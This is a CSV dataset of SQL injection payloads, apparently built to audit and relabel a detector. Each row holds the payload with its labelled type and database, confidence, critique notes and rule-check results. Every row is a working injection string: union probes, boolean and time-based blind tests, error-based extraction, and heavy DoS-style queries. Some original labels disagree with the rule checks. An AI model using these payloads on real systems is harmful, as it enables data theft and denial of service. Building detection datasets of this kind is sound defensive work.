payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,24450,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.5,group_concat,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,mysql,24451,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""endx"" = ""endx",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,24452,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""endx"" = ""endx"
1 ) ) as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,24453,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) ) as dhqt where 8485 = 8485 waitfor delay '0:0:5'--
"-1059"" ) union all select 1276,1276,1276,1276,1276,1276,1276,1276#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24454,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1059"" ) union all select 1276,1276,1276,1276,1276,1276,1276,1276#"
"-3377"" ) or 4982 = 6608#",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24455,boolean_blind,generic,Pattern match: 'or 4982 = 6608' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-3377"" ) or 4982 = 6608#"
"-7676"" ) ) as flov where 7967 = 7967 union all select 7967--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24456,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7676"" ) ) as flov where 7967 = 7967 union all select 7967--"
1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24457,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq
"-1630' union all select 1971,1971--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24458,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1630' union all select 1971,1971--"
"1 ) as mwcs where 2544 = 2544 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24459,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) as mwcs where 2544 = 2544 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --"
"-6436' in boolean mode ) union all select 7589,7589,7589,7589--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24460,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6436' in boolean mode ) union all select 7589,7589,7589,7589--"
1'+ ( select 'ozpm' where 6939 = 6939 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +',time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24461,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'ozpm' where 6939 = 6939 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +'
"1"" where 3318 = 3318",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24462,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 3318 = 3318"
"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'ukxj' = 'ukxj",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,24463,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'ukxj' = 'ukxj"
"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24464,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #"
"1' ) ) union all select null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24465,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) union all select null,null,null,null#"
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'fvbv' = 'fvbv",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24466,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'fvbv' = 'fvbv"
1' ) as jwch where 4609 = 4609,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24467,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as jwch where 4609 = 4609
1 ) as afmb where 8665 = 8665 order by 1#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24468,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as afmb where 8665 = 8665 order by 1#
"-7107"" ) ) ) order by 1#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24469,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"-7107"" ) ) ) order by 1#"
1' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,time_blind,postgresql,0.7,pg_sleep,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,24470,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
"1"" and elt ( 4594 = 1040,1040 )",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,24471,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" and elt ( 4594 = 1040,1040 )"
-6764' ) or 2314 = 2017--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,24472,boolean_blind,generic,Pattern match: 'or 2314 = 2017' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6764' ) or 2314 = 2017--
1 ) as iiku where 9466 = 9466,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24473,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as iiku where 9466 = 9466
1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,24474,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )
-9847%' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = ',time_blind,postgresql,0.7,pg_sleep,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,24475,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-9847%' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = '
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,24476,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh"
-7273%' ) ) order by 1#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24477,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-7273%' ) ) order by 1#
"-8005"" ) union all select 5213,5213,5213,5213,5213--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24478,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8005"" ) union all select 5213,5213,5213,5213,5213--"
"1' in boolean mode ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24479,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' in boolean mode ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #"
"-2168"" ) ) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24480,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2168"" ) ) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--"
"1"" ) where 6903 = 6903",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24481,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 6903 = 6903"
"1'|| ( select 'asfl' from dual where 5846 = 5846 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,24482,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'|| ( select 'asfl' from dual where 5846 = 5846 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24483,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--"
"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24484,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --"
"1"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,24485,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" ) as ucex where 5148 = 5148 order by 1#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24486,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as ucex where 5148 = 5148 order by 1#"
1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'qrtf' = 'qrtf,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,24487,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'qrtf' = 'qrtf
"-8178 ) union all select 4163,4163,4163,4163,4163,4163,4163--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24488,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8178 ) union all select 4163,4163,4163,4163,4163,4163,4163--"
"-5832"" ) or 1650 = 9011--",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24489,boolean_blind,generic,Pattern match: 'or 1650 = 9011' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5832"" ) or 1650 = 9011--"
"-3282' ) union all select 9002,9002,9002,9002,9002#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24490,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3282' ) union all select 9002,9002,9002,9002,9002#"
"1 ) where 5615 = 5615 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24491,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) where 5615 = 5615 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --"
"-1134"" union all select 4865,4865,4865,4865,4865#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24492,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1134"" union all select 4865,4865,4865,4865,4865#"
"-1908"" ) ) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24493,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1908"" ) ) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#"
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,24494,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd"
"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,24495,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu"
"-9737"" ) ) ) order by 1--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24496,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"-9737"" ) ) ) order by 1--"
1' ) as wvvo where 4288 = 4288,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24497,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as wvvo where 4288 = 4288
"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo",time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24498,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo"
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,24499,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """
"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24500,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#"
1'|| ( select 'ubza' where 2576 = 2576,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,24501,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'ubza' where 2576 = 2576
-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24502,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--
1 ) ) as vmwj where 5597 = 5597,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24503,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as vmwj where 5597 = 5597
"-8301' ) union all select 1806,1806--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24504,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8301' ) union all select 1806,1806--"
1' ) as sruz where 6318 = 6318,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24505,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as sruz where 6318 = 6318
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,24506,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf"
1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmnf,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,24507,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmnf
1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'ejnt' like 'ejnt,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24508,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'ejnt' like 'ejnt
( select ( case when ( 1570 = 6977 ) then 1 else 1570* ( select 1570 from mysql.db ) end ) ),error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,24509,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select ( case when ( 1570 = 6977 ) then 1 else 1570* ( select 1570 from mysql.db ) end ) )
1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24510,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--
"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,24511,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
